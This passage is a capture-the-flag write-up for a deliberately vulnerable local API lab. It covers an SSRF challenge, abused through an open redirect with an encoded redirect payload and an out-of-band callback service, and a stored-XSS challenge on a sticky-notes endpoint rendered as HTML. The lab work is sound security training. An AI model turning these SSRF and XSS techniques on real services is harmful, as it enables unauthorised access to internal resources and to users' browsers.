[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle.com%2F%2F%252F%252E%252E
```

Take the field's value payload and decode the Base64, preferably as text over hex format reveals a developer HTML site:

![SS2](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/cb6d3f1e-765c-4348-99b7-f35e6e6c1d1b)

I chose to try and abuse the open redirect using Burp Collaborator and returns a base-64 encoded string:

![SS3](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/e8632b77-3487-404b-9b9d-38f9457b0190)

The decoded result is my value from the Burp Collaborator payload. Another alternative would be to use an online Webhook service such as `https://webhook.site/` where you can manually set a flag value.

![SS4](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/5bbed36d-5ee2-4901-82ec-7226c2cadca4)

This shows the open SSRF vulnerability and thus the flag.

![SS5](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/59ecda8c-6465-4d5b-acef-1d0c0200b3ae)

## **StickyNotes**

Still more fun! Let's checkout the `POST` to REST API endpoint `/vapi/stickynotes`:

![STICKY1](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/68a5b93d-65b5-4734-a9dd-ba0bfcfe3af6)

The only real thing of interest here is the `?format=html` custom parameter within the `GET` request. To see any evidence of a potential XSS attack (since the `data` is rendered as HTML here).

![STICKY2](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/9a491e06-2c5e-418e-bb9d-e05118c83136)

We see a `201` HTTP response and what looks to be successful, a flag!

![STICKY3](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/d5fc17c5-86be-4792-bea9-bca801bb2f27)

Now for the icing on the cake, let's fire up a web-browser to this API endpoint at `http://127.0.0.1/vapi/stickynotes?format=html`:

![STICKY4 XSS FLAG](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/14c18ac7-b708-46c4-a583-582c9e401b81)
![STICKY4 XSS FLAG 2](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/f6f7e0bc-90f9-4ddf-8810-f63bc3369950)

EOF 💾
